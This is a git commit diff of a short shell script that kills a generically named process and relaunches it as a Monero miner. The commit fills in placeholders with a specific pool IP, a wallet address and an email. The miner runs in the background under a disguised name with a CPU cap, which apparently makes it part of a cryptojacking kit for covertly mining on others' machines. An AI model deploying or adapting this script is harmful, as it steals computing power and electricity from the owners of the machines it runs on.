01ff0c992b0e6f0740a3a588f37aca30ac0e42d6
Acronym13 <60100405+Acronym13@users.noreply.github.com>
2020-01-20 05:12:00 -0800

    Update 6.sh

--- 6.sh
+++ 6.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
+defaultsoftwarename -o 54.37.56.32:48017 -u 42mFJRYestK5mdjgBtskMHcjGsNJR6NLaa7oZMNyxuAWQLsNTo8pCVvU63E5GAg5pUPErcADggW5NGLmQFVPQDcSAEvbpsr --pass=x:pay2playbytheway@protonmail.com --rig-id=1 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
